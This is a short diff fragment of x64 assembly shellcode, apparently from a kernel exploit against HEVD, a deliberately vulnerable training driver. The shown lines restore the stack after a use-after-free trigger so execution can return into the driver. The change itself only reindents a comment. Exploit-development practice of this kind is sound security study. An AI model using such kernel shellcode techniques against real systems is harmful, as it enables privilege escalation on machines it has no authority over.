@@ -5,7 +5,7 @@ Shellcode PROC
 								; rbx, r12, r13, r14, r15
 
 	recover_stack:						; recover the stack nice and early
-										; we want to return to HEVD+0x85163
+								; we want to return to HEVD+0x85163
 		mov rax, r11					; r11 (pre-UaF trigger) is rsp + 0x40
 		mov rcx, 040h					;
 		add rax, rcx					; rax now contains old stack value
